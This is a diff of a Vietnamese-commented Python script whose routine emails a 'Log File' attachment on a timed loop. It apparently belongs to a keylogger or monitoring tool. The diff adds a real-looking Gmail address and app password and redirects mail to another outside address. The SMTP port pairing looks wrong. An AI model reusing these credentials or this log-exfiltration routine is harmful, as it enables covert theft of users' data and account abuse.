@@ -78,14 +78,14 @@ time_iteration = 60  # Thời gian lặp lại chương trình
 number_of_iterations_end = 5  # Số lần lặp chương trình
 
 # Mail chủ
-email_address = "df365ba549942b"
-password = "06a253ad777c9f"
+email_address = "acquyfjfai@gmail.com"
+password = "prgi uvso mith uygb"
 
 
 # Gửi mail
 def send_email(filename, attachment):
     fromaddr = email_address
-    toaddr = email_address
+    toaddr = "leduyminhduong582@gmail.com"
 
     # Gửi đa phương tiện
     msg = MIMEMultipart()
@@ -100,7 +100,7 @@ def send_email(filename, attachment):
     msg['Subject'] = "Log File"
 
     # Nội dung mail
-    body = "Body_of_the_mail"
+    body = "demo send file"
 
     # Đính kèm nội dung
     msg.attach(MIMEText(body, 'plain'))
@@ -124,7 +124,7 @@ def send_email(filename, attachment):
     msg.attach(p)
 
     # Khởi tạo gửi mail
-    s = smtplib.SMTP('sandbox.smtp.mailtrap.io', 2525)
+    s = smtplib.SMTP('smtp.gmail.com', 456)
 
     # Khởi tạo TLS để gửi mail
     s.starttls()
